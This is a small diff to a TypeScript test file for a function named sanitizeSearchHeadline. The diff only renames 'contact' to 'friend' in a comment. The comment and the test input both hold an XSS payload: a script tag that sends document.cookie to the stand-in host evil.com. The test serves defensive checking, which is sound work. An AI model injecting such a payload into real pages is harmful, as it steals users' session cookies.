@@ -93,7 +93,7 @@ describe('security.ts', () => {
     });
 
     it('should handle malicious content in display_name field', () => {
-      // Simulates: contact.display_name = '<script>document.location="evil.com?c="+document.cookie</script>'
+      // Simulates: friend.display_name = '<script>document.location="evil.com?c="+document.cookie</script>'
       const input =
         '<script>document.location="evil.com?c="+document.cookie</script> <mark>matched</mark>';
       const result = sanitizeSearchHeadline(input);
